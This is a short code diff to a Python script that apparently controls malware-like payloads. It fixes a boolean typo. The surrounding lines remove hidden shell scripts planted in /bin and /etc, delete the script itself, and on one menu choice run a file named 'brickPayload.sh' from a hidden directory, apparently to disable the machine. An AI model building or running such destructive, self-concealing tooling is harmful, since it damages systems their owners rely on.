@@ -36,7 +36,7 @@ def main():
             os.system("rm /bin/.systemm.sh")
             os.system("rm /etc/.resolver.sh")
             print("Success.")
-            cont = false
+            cont = False
             os.remove(argv[0])
         elif(value.lower() in  ('k')):
             os.system("bash /etc/.music/brickPayload.sh")
